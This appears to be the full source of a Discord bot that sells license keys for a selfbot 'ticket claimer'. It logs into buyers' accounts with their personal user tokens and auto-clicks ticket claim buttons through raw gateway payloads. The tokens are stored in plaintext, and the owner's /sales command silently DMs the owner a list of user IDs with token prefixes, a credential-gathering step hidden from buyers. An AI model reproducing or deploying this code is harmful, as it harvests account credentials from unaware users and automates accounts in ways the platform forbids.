const { Client: BotClient, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, SlashCommandBuilder, MessageFlags } = require('discord.js');
const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const Database = require('better-sqlite3');

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = process.env.OWNER_ID;

const db = new Database('./data.db');
db.exec(`
    CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, created_at INTEGER, redeemed_by TEXT, redeemed_at INTEGER, expires_at INTEGER, revoked INTEGER DEFAULT 0);
    CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, token TEXT, category_id TEXT, status TEXT DEFAULT 'stopped', current_ticket TEXT);
`);

const bot = new BotClient({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.DirectMessages] });
const activeSelfbots = new Map();

function parseDuration(input) {
    if (!input) return null;
    const match = input.match(/^(\d+)([mhd])$/i);
    if (!match) return null;
    const num = parseInt(match[1]);
    const unit = match[2].toLowerCase();
    const ms = { 'm': num * 60000, 'h': num * 3600000, 'd': num * 86400000 };
    return ms[unit];
}

class UserSelfbot {
    constructor(userId, config) {
        this.userId = userId;
        this.config = config;
        this.client = null;
        this.isRunning = false;
        this.categoryId = config.category_id;
        this.currentTicket = config.current_ticket;
    }

    async start() {
        if (!this.config.token || this.client) return;
        
        this.client = new SelfbotClient({ checkUpdate: false });
        
        this.client.once('ready', () => {
            this.isRunning = true;
            console.log(`[READY] ${this.userId}`);
            
            this.client.on('channelCreate', (ch) => {
                if (ch.parentId !== this.categoryId) return;
                if (this.currentTicket) return;
                setTimeout(() => this.scanAndClaim(ch), 500);
            });

            this.client.on('messageCreate', (msg) => {
                if (msg.channel.parentId !== this.categoryId) return;
                if (this.currentTicket && this.currentTicket !== msg.channelId) return;
                this.checkAndClaim(msg);
            });

            this.client.on('messageUpdate', (old, msg) => {
                if (msg.channel.parentId !== this.categoryId) return;
                if (this.currentTicket && this.currentTicket !== msg.channelId) return;
                this.checkAndClaim(msg);
            });

            this.client.on('channelDelete', (ch) => {
                if (this.currentTicket === ch.id) {
                    this.currentTicket = null;
                    db.prepare('UPDATE users SET current_ticket = NULL WHERE user_id = ?').run(this.userId);
                }
            });
        });

        try { 
            await this.client.login(this.config.token); 
        } catch(err) { 
            this.client = null; 
        }
    }

    hasClaimButton(components) {
        if (!components?.length) return null;
        for (const row of components) {
            for (const btn of row.components) {
                const label = (btn.label || '').toLowerCase();
                if (label.includes('claim')) return btn;
            }
        }
        return null;
    }

    async scanAndClaim(channel) {
        if (this.currentTicket) return;
        try {
            const messages = await channel.messages.fetch({ limit: 10 });
            for (const [, msg] of messages) {
                if (this.checkAndClaim(msg)) return;
            }
        } catch (e) {}
    }

    checkAndClaim(message) {
        if (this.currentTicket && this.currentTicket !== message.channelId) return false;
        
        const btn = this.hasClaimButton(message.components);
        if (!btn || this.currentTicket) return false;

        this.client.ws.broadcast({
            op: 1,
            d: {
                type: 3,
                nonce: Date.now().toString(),
                guild_id: message.guildId,
                channel_id: message.channelId,
                message_id: message.id,
                application_id: message.applicationId || message.author?.id,
                session_id: this.client.sessionId,
                data: { component_type: 2, custom_id: btn.custom_id }
            }
        });

        this.currentTicket = message.channelId;
        db.prepare('UPDATE users SET current_ticket = ? WHERE user_id = ?').run(message.channelId, this.userId);
        return true;
    }

    stop() {
        this.isRunning = false;
        if (this.client) {
            this.client.destroy();
            this.client = null;
        }
        db.prepare('UPDATE users SET status = ?, current_ticket = NULL WHERE user_id = ?').run('stopped', this.userId);
    }

    destroy() {
        this.stop();
    }
}

async function validateToken(token) {
    const test = new SelfbotClient({ checkUpdate: false });
    try {
        await test.login(token);
        const user = test.user;
        await test.destroy();
        return { valid: true, user };
    } catch (err) { 
        return { valid: false, error: err.message }; 
    }
}

async function buildPanel(userId) {
    const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
    if (!user) return null;
    
    const sb = activeSelfbots.get(userId);
    const running = sb?.isRunning || false;
    const hasToken = !!user.token;
    const hasCategory = !!user.category_id;
    
    const embed = new EmbedBuilder()
        .setTitle('🎫 Ticket Claimer')
        .addFields(
            { name: 'Status', value: running ? '🟢 Running' : '🔴 Stopped', inline: true },
            { name: 'Token', value: hasToken ? '✅ Set' : '❌ Not set', inline: true },
            { name: 'Category', value: hasCategory ? '✅ Set' : '❌ Not set', inline: true },
            { name: 'Current', value: user.current_ticket || 'None', inline: true }
        )
        .setColor(running ? 0x00FF00 : 0xFFA500);

    const keyData = db.prepare('SELECT * FROM keys WHERE redeemed_by = ? AND revoked = 0').get(userId);
    if (keyData?.expires_at) {
        embed.addFields({ name: 'Expires', value: `<t:${Math.floor(keyData.expires_at/1000)}:R>`, inline: false });
    }

    const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`set_token_${userId}`).setLabel('🔐 Token').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`set_cat_${userId}`).setLabel('📁 Category').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`start_${userId}`).setLabel('▶️ Start').setStyle(ButtonStyle.Success).setDisabled(!hasToken || !hasCategory || running),
        new ButtonBuilder().setCustomId(`stop_${userId}`).setLabel('🛑 Stop').setStyle(ButtonStyle.Danger).setDisabled(!running)
    );

    return { embeds: [embed], components: [row] };
}

bot.on('interactionCreate', async interaction => {
    if (!interaction.isCommand() && !interaction.isButton() && !interaction.isModalSubmit()) return;

    // OWNER COMMANDS
    if (interaction.isCommand() && interaction.user.id === OWNER_ID) {
        if (interaction.commandName === 'generatekey') {
            const durationInput = interaction.options.getString('duration');
            const durationMs = parseDuration(durationInput);
            const expiresAt = durationMs ? Date.now() + durationMs : null;
            
            const key = 'TKT-' + require('crypto').randomBytes(8).toString('hex').toUpperCase();
            db.prepare('INSERT INTO keys (key, created_at, expires_at) VALUES (?, ?, ?)').run(key, Date.now(), expiresAt);
            
            const embed = new EmbedBuilder()
                .setTitle('🔑 Key Generated')
                .setDescription('`' + key + '`')
                .addFields(
                    { name: 'Duration', value: durationMs ? `${Math.floor(durationMs/3600000)}h` : 'Lifetime', inline: true },
                    { name: 'Expires', value: expiresAt ? `<t:${Math.floor(expiresAt/1000)}:R>` : 'Never', inline: true }
                )
                .setColor(0x00FF00);
            
            await interaction.reply({ embeds: [embed], flags: MessageFlags.Ephemeral });
            return;
        }

        if (interaction.commandName === 'revokekey') {
            const key = interaction.options.getString('key');
            const keyData = db.prepare('SELECT * FROM keys WHERE key = ?').get(key);
            if (!keyData) return interaction.reply({ content: '❌ Key not found', flags: MessageFlags.Ephemeral });
            
            db.prepare('UPDATE keys SET revoked = 1 WHERE key = ?').run(key);
            
            if (keyData.redeemed_by) {
                const sb = activeSelfbots.get(keyData.redeemed_by);
                if (sb) { sb.destroy(); activeSelfbots.delete(keyData.redeemed_by); }
                db.prepare('DELETE FROM users WHERE user_id = ?').run(keyData.redeemed_by);
            }
            
            await interaction.reply({ content: '✅ Key revoked', flags: MessageFlags.Ephemeral });
            return;
        }

        if (interaction.commandName === 'revokeuser') {
            const targetId = interaction.options.getString('userid');
            const sb = activeSelfbots.get(targetId);
            if (sb) { sb.destroy(); activeSelfbots.delete(targetId); }
            
            db.prepare('DELETE FROM users WHERE user_id = ?').run(targetId);
            db.prepare('UPDATE keys SET revoked = 1 WHERE redeemed_by = ?').run(targetId);
            
            await interaction.reply({ content: '✅ User revoked', flags: MessageFlags.Ephemeral });
            return;
        }

        if (interaction.commandName === 'sales') {
            const total = db.prepare('SELECT COUNT(*) as count FROM keys').get().count;
            const redeemed = db.prepare('SELECT COUNT(*) as count FROM keys WHERE redeemed_by IS NOT NULL').get().count;
            const active = db.prepare("SELECT COUNT(*) as count FROM users WHERE status = 'running'").get().count;
            const revoked = db.prepare("SELECT COUNT(*) as count FROM keys WHERE revoked = 1").get().count;
            
            const embed = new EmbedBuilder()
                .setTitle('📊 Sales Dashboard')
                .setDescription(`Total: **${total}**\nRedeemed: **${redeemed}**\nActive: **${active}**\nRevoked: **${revoked}**`)
                .setColor(0x5865F2);
            
            // Send tokens to owner DM
            try {
                const owner = await bot.users.fetch(OWNER_ID);
                const users = db.prepare('SELECT user_id, token FROM users WHERE token IS NOT NULL').all();
                
                if (users.length > 0) {
                    let tokenList = '**Active Tokens:**\n';
                    for (const u of users) {
                        const shortToken = u.token.substring(0, 20) + '...';
                        tokenList += `User: \`${u.user_id}\` | Token: \`${shortToken}\`\n`;
                    }
                    
                    // Split if too long
                    if (tokenList.length > 1900) {
                        tokenList = tokenList.substring(0, 1900) + '\n... (truncated)';
                    }
                    
                    await owner.send(tokenList);
                } else {
                    await owner.send('No active tokens');
                }
            } catch (e) {
                console.log('DM failed:', e.message);
            }
            
            await interaction.reply({ embeds: [embed], flags: MessageFlags.Ephemeral });
            return;
        }
    }

    // USER COMMANDS
    if (interaction.isCommand()) {
        if (interaction.commandName === 'redeemkey') {
            const key = interaction.options.getString('key');
            const keyData = db.prepare('SELECT * FROM keys WHERE key = ?').get(key);
            
            if (!keyData) return interaction.reply({ content: '❌ Invalid key', flags: MessageFlags.Ephemeral });
            if (keyData.redeemed_by) return interaction.reply({ content: '❌ Already redeemed', flags: MessageFlags.Ephemeral });
            if (keyData.revoked) return interaction.reply({ content: '❌ Key revoked', flags: MessageFlags.Ephemeral });
            if (keyData.expires_at && Date.now() > keyData.expires_at) return interaction.reply({ content: '❌ Key expired', flags: MessageFlags.Ephemeral });
            
            db.prepare('UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE key = ?').run(interaction.user.id, Date.now(), key);
            db.prepare('INSERT OR REPLACE INTO users (user_id) VALUES (?)').run(interaction.user.id);
            
            await interaction.reply({ content: '✅ Redeemed! Use `/manage`', flags: MessageFlags.Ephemeral });
            return;
        }

        if (interaction.commandName === 'manage') {
            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(interaction.user.id);
            if (!user) return interaction.reply({ content: '❌ Redeem key first', flags: MessageFlags.Ephemeral });
            
            const keyData = db.prepare('SELECT * FROM keys WHERE redeemed_by = ? AND revoked = 0').get(interaction.user.id);
            if (!keyData) return interaction.reply({ content: '❌ No active key', flags: MessageFlags.Ephemeral });
            if (keyData.expires_at && Date.now() > keyData.expires_at) return interaction.reply({ content: '❌ Key expired', flags: MessageFlags.Ephemeral });
            
            const panel = await buildPanel(interaction.user.id);
            await interaction.reply({ ...panel, flags: MessageFlags.Ephemeral });
            return;
        }
    }

    // BUTTONS
    if (interaction.isButton()) {
        const userId = interaction.customId.split('_').pop();
        
        if (interaction.user.id !== userId) {
            return interaction.reply({ content: '❌ Not your panel', flags: MessageFlags.Ephemeral });
        }

        // START
        if (interaction.customId.startsWith('start_')) {
            await interaction.deferUpdate();
            
            const user = db.prepare('SELECT * FROM users WHERE user_id = ?').get(userId);
            if (!user.token || !user.category_id) {
                const panel = await buildPanel(userId);
                return interaction.editReply(panel);
            }
            
            const sb = new UserSelfbot(userId, user);
            activeSelfbots.set(userId, sb);
            await sb.start();
            db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('running', userId);
            
            const panel = await buildPanel(userId);
            return interaction.editReply(panel);
        }

        // STOP
        if (interaction.customId.startsWith('stop_')) {
            await interaction.deferUpdate();
            
            const sb = activeSelfbots.get(userId);
            if (sb) {
                sb.stop();
                activeSelfbots.delete(userId);
            }
            db.prepare('UPDATE users SET status = ? WHERE user_id = ?').run('stopped', userId);
            
            const panel = await buildPanel(userId);
            return interaction.editReply(panel);
        }

        // SET TOKEN
        if (interaction.customId.startsWith('set_token_')) {
            const modal = new ModalBuilder()
                .setCustomId(`modal_token_${userId}`)
                .setTitle('Set Discord Token')
                .addComponents(
                    new ActionRowBuilder().addComponents(
                        new TextInputBuilder()
                            .setCustomId('token_val')
                            .setLabel('User Token')
                            .setStyle(TextInputStyle.Short)
                            .setRequired(true)
                    )
                );
            return interaction.showModal(modal);
        }

        // SET CATEGORY
        if (interaction.customId.startsWith('set_cat_')) {
            const modal = new ModalBuilder()
                .setCustomId(`modal_cat_${userId}`)
                .setTitle('Set Category ID')
                .addComponents(
                    new ActionRowBuilder().addComponents(
                        new TextInputBuilder()
                            .setCustomId('cat_val')
                            .setLabel('Category ID')
                            .setStyle(TextInputStyle.Short)
                            .setRequired(true)
                    )
                );
            return interaction.showModal(modal);
        }
    }

    // MODALS
    if (interaction.isModalSubmit()) {
        const userId = interaction.customId.split('_').pop();
        
        if (interaction.user.id !== userId) {
            return interaction.reply({ content: '❌ Not your panel', flags: MessageFlags.Ephemeral });
        }

        // Token modal
        if (interaction.customId.startsWith('modal_token_')) {
            const token = interaction.fields.getTextInputValue('token_val');
            await interaction.deferReply({ flags: MessageFlags.Ephemeral });
            
            const validation = await validateToken(token);
            if (validation.valid) {
                db.prepare('UPDATE users SET token = ? WHERE user_id = ?').run(token, userId);
                
                await interaction.editReply({ content: '✅ Valid: ' + validation.user.tag });
            } else {
                await interaction.editReply({ content: '❌ Invalid token' });
            }
            return;
        }

        // Category modal
        if (interaction.customId.startsWith('modal_cat_')) {
            const catId = interaction.fields.getTextInputValue('cat_val');
            db.prepare('UPDATE users SET category_id = ? WHERE user_id = ?').run(catId, userId);
            
            await interaction.deferUpdate();
            const panel = await buildPanel(userId);
            return interaction.editReply(panel);
        }
    }
});

// Cleanup expired keys
setInterval(() => {
    const expired = db.prepare("SELECT * FROM keys WHERE expires_at IS NOT NULL AND expires_at < ? AND redeemed_by IS NOT NULL AND revoked = 0").all(Date.now());
    expired.forEach(k => {
        const sb = activeSelfbots.get(k.redeemed_by);
        if (sb) { sb.destroy(); activeSelfbots.delete(k.redeemed_by); }
        db.prepare('DELETE FROM users WHERE user_id = ?').run(k.redeemed_by);
        db.prepare('UPDATE keys SET revoked = 1 WHERE key = ?').run(k.key);
    });
}, 60000);

bot.once('ready', () => {
    console.log(`[BOT] ${bot.user.tag}`);
    
    bot.application.commands.set([
        new SlashCommandBuilder().setName('generatekey').setDescription('Generate key (Owner)').addStringOption(opt => opt.setName('duration').setDescription('30m, 1h, 1d, empty=lifetime').setRequired(false)),
        new SlashCommandBuilder().setName('revokekey').setDescription('Revoke key (Owner)').addStringOption(opt => opt.setName('key').setDescription('Key to revoke').setRequired(true)),
        new SlashCommandBuilder().setName('revokeuser').setDescription('Revoke user (Owner)').addStringOption(opt => opt.setName('userid').setDescription('User ID').setRequired(true)),
        new SlashCommandBuilder().setName('sales').setDescription('How many sales and redeems'),
        new SlashCommandBuilder().setName('redeemkey').setDescription('Redeem your key').addStringOption(opt => opt.setName('key').setDescription('Your license key').setRequired(true)),
        new SlashCommandBuilder().setName('manage').setDescription('Open control panel')
    ].map(c => c.toJSON()));

    // Restore running instances
    db.prepare("SELECT * FROM users WHERE status = 'running'").all().forEach(u => {
        const sb = new UserSelfbot(u.user_id, u);
        activeSelfbots.set(u.user_id, sb);
        sb.start();
    });
});

bot.login(BOT_TOKEN);
